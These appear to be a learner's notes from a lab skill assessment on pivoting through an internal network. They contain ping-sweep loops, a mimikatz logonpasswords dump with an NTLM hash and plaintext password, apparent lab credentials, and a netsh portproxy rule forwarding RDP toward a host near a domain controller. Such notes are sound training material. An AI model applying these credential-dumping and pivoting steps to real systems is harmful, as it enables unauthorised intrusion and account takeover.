![[skill assessment.drawio.png]]

- 10.129.121.82 
	- internal IP: 172.16.5.15 
	- id_rsa for webadmin
	- `for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done`
		- run this on 10.129.135.224 
		- 172.16.5.35
- 172.16.5.35 
	- `mlefay:Plain Human work!` -- for connecting servers in internal network 
	- pivot host - 10.129.135.224 
	- Internal IP - 172.16.6.35
	-  open ports - 22,135,139,445,3389
	- run .\mimikatz.exe
		- `sekurlsa::logonpasswords`
			- Username: vfrank
			- NTLM     : 2e16a00be74fa0bf862b4256d0347e83
			- Password: Imply wet Unmasked!
	- `for /L %i in (1,1,255) do @ping -n 1 -w 200 172.16.6.%i > nul && echo 172.16.6.%i is up.` -- ping sweep to find other servers
		- 172.16.6.25 and 172.16.6.45 
	- `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=172.16.5.35 connectport=3389 connectaddress=172.16.6.25`
- 172.16.6.25
	- vfrank:'Imply wet Unmasked!'
	- there was a drive mapped on the server `AutomateDCAdmin (Z:)` 
		- which is the drive for Domain Controller

